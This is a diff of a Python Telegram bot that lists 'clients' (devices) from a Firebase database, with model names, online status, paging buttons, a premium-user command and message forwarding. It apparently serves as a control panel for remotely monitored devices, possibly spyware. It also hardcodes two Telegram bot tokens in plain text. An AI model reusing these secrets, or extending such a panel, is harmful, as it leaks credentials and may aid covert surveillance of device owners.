@@ -112,10 +112,10 @@ async def show_device_page(update, context, page):
         return
     
     try:
-        response = requests.get(f"{firebase_base}/user_data.json")
+        response = requests.get(f"{firebase_base}.json")
         clients = response.json()
         if not clients:
-            await update.message.reply_text("Koi clients nahi mile.")
+            await update.message.reply_text("Koi clients nahi mile 📱.")
             return
 
         items = list(clients.items())
@@ -126,17 +126,17 @@ async def show_device_page(update, context, page):
         page_items = items[start_idx : start_idx + 10]
 
         keyboard = []
-        msg = "📱 **MASTER DEVICES LIST:**\n\n"
+        msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            name = info.get('d_name', 'Unknown')
-            status_icon = "🟢" if info.get('status') == "online" else "🔴"
+            name = info.get('modelName', 'Unknown')
+            status_icon = "🟢" if info.get('status') == True else "🔴"
             msg += f"{status_icon} {name}\n"
-            keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"m_view_{client_id}")])
+            keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])
 
         nav = []
-        if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"m_page_{page-1}"))
-        nav.append(InlineKeyboardButton("❌ Cancel", callback_data="m_cancel"))
-        if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"m_page_{page+1}"))
+        if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"page_{page-1}"))
+        nav.append(InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
+        if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
         keyboard.append(nav)
 
         if update.callback_query:
@@ -301,7 +301,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
 if __name__ == '__main__':
-    TOKEN = '8625469610:AAE2R7UpGmuyC7atp7xvX3f8Lns-u9PmCrE'
+    TOKEN = '8720005848:AAGxPsJFZTG1-4boeVFXoKYOMOK5QMnyuf4'
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("addpremium", add_premium))
